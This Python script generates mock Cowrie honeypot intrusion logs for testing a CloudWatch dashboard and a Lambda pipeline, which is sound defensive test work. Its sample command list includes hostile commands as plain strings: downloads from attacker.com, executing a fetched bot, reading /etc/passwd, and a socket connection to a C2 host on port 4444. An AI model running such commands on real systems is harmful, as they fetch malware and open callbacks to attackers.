#!/usr/bin/env python3
"""
Generate mock Cowrie honeypot logs and send to CloudWatch
Creates realistic intrusion data for testing dashboard and Lambda
"""

import json
import boto3
import random
from datetime import datetime, timedelta
import argparse

# Realistic data for mock events
ATTACKER_IPS = [
    "203.0.113.45",
    "198.51.100.23",
    "192.0.2.187",
    "203.0.113.99",
    "198.51.100.145",
    "192.0.2.58",
    "203.0.113.176",
    "198.51.100.203"
]

USERNAMES = ["root", "admin", "ubadmin", "ubuntu", "pi", "oracle", "mysql", "postgres"]

PASSWORDS = ["123456", "password", "admin", "root", "12345678", "qwerty", "abc123", ""]

COMMANDS = [
    "whoami",
    "id",
    "passwd",
    "cat /etc/passwd",
    "ls -la /",
    "ps aux",
    "uname -a",
    "ifconfig",
    "netstat -an",
    "curl http://attacker.com/malware.sh",
    "wget http://attacker.com/bot.bin",
    "chmod +x /tmp/bot && /tmp/bot",
    "python -c 'import socket; s=socket.socket(); s.connect((\"C2\",4444))'",
]

USER_AGENTS = [
    "SSH-2.0-OpenSSH_for_Windows_9.5",
    "SSH-2.0-OpenSSH_7.4",
    "SSH-2.0-libssh_0.8.1",
    "SSH-2.0-PuTTY_Release_0.76",
]


def generate_session_id():
    """Generate random session ID"""
    return ''.join(random.choices('0123456789abcdef', k=16))


def generate_mock_events(count=20):
    """Generate mock Cowrie JSON events"""
    events = []
    now = datetime.utcnow()
    
    for i in range(count):
        # Random time in last 24 hours
        event_time = now - timedelta(seconds=random.randint(0, 86400))
        timestamp = event_time.isoformat() + "+0000"
        
        attacker_ip = random.choice(ATTACKER_IPS)
        session_id = generate_session_id()
        username = random.choice(USERNAMES)
        password = random.choice(PASSWORDS)
        
        # Session start event
        session_start = {
            "eventid": "cowrie.session.connect",
            "timestamp": timestamp,
            "src_ip": attacker_ip,
            "src_port": random.randint(10000, 65000),
            "dst_ip": "172.17.0.2",
            "dst_port": 2222,
            "session": session_id,
            "protocol": "ssh",
            "message": f"New connection: {attacker_ip}"
        }
        events.append(session_start)
        
        # Login attempt event
        login_event = {
            "eventid": "cowrie.login.attempt" if random.random() < 0.3 else "cowrie.login.success",
            "timestamp": timestamp,
            "username": username,
            "password": password,
            "src_ip": attacker_ip,
            "session": session_id,
            "success": random.random() > 0.3,
            "message": f"login attempt [{username}/{password}]"
        }
        events.append(login_event)
        
        # If login succeeded, add command events
        if login_event.get("success"):
            for _ in range(random.randint(1, 5)):
                cmd_time = event_time + timedelta(seconds=random.randint(1, 120))
                cmd_timestamp = cmd_time.isoformat() + "+0000"
                
                command_event = {
                    "eventid": "cowrie.command.input",
                    "timestamp": cmd_timestamp,
                    "session": session_id,
                    "command": random.choice(COMMANDS),
                    "src_ip": attacker_ip,
                    "message": f"Command: {random.choice(COMMANDS)}"
                }
                events.append(command_event)
        
        # Session close event
        close_time = event_time + timedelta(seconds=random.randint(60, 3600))
        close_timestamp = close_time.isoformat() + "+0000"
        
        session_close = {
            "eventid": "cowrie.session.close",
            "timestamp": close_timestamp,
            "session": session_id,
            "duration": random.randint(60, 3600),
            "src_ip": attacker_ip,
            "message": "connection lost"
        }
        events.append(session_close)
    
    return events


def send_to_cloudwatch(log_group, log_stream, events, region="us-east-1"):
    """Send mock events to CloudWatch Logs"""
    client = boto3.client('logs', region_name=region)
    
    try:
        # Ensure log stream exists
        try:
            client.create_log_stream(
                logGroupName=log_group,
                logStreamName=log_stream
            )
            print(f"✓ Created log stream: {log_stream}")
        except client.exceptions.ResourceAlreadyExistsException:
            print(f"✓ Log stream already exists: {log_stream}")
        
        # Send logs in batches (CloudWatch has limits)
        batch_size = 20
        for i in range(0, len(events), batch_size):
            batch = events[i:i+batch_size]
            
            log_events = [
                {
                    'timestamp': int(datetime.fromisoformat(
                        event['timestamp'].replace('+0000', '')
                    ).timestamp() * 1000),
                    'message': json.dumps(event)
                }
                for event in batch
            ]
            
            # Sort by timestamp
            log_events.sort(key=lambda x: x['timestamp'])
            
            client.put_log_events(
                logGroupName=log_group,
                logStreamName=log_stream,
                logEvents=log_events
            )
            
            print(f"✓ Sent batch {i//batch_size + 1}/{(len(events)-1)//batch_size + 1} ({len(log_events)} events)")
        
        print(f"\n✓ Successfully sent {len(events)} mock events to CloudWatch!")
        print(f"  Log Group: {log_group}")
        print(f"  Log Stream: {log_stream}")
        print(f"\nCheck CloudWatch Dashboard to see populated data:")
        print(f"  https://console.aws.amazon.com/cloudwatch/home?region={region}")
        
    except Exception as e:
        print(f"✗ Error sending logs to CloudWatch: {e}")
        raise


def main():
    parser = argparse.ArgumentParser(
        description="Generate and send mock intrusion logs to CloudWatch"
    )
    parser.add_argument(
        "--count",
        type=int,
        default=20,
        help="Number of mock intrusion sessions to generate (default: 20)"
    )
    parser.add_argument(
        "--log-group",
        default="/honeypot/cloud-intrusion-platform/cowrie",
        help="CloudWatch Log Group name"
    )
    parser.add_argument(
        "--log-stream",
        default="cowrie-events",
        help="CloudWatch Log Stream name"
    )
    parser.add_argument(
        "--region",
        default="us-east-1",
        help="AWS region (default: us-east-1)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("MOCK INTRUSION DATA GENERATOR")
    print("=" * 60)
    print(f"Generating {args.count} mock intrusion sessions...")
    print()
    
    # Generate events
    events = generate_mock_events(args.count)
    print(f"✓ Generated {len(events)} mock events:")
    
    # Count event types
    event_counts = {}
    for event in events:
        event_id = event.get("eventid", "unknown")
        event_counts[event_id] = event_counts.get(event_id, 0) + 1
    
    for event_type, count in sorted(event_counts.items()):
        print(f"  - {event_type}: {count}")
    
    print()
    print("Sending to CloudWatch Logs...")
    print()
    
    # Send to CloudWatch
    send_to_cloudwatch(args.log_group, args.log_stream, events, args.region)
    
    print()
    print("=" * 60)
    print("Lambda function will automatically process these logs")
    print("Check DynamoDB 'intrusion-events' table for parsed data")
    print("=" * 60)


if __name__ == "__main__":
    main()
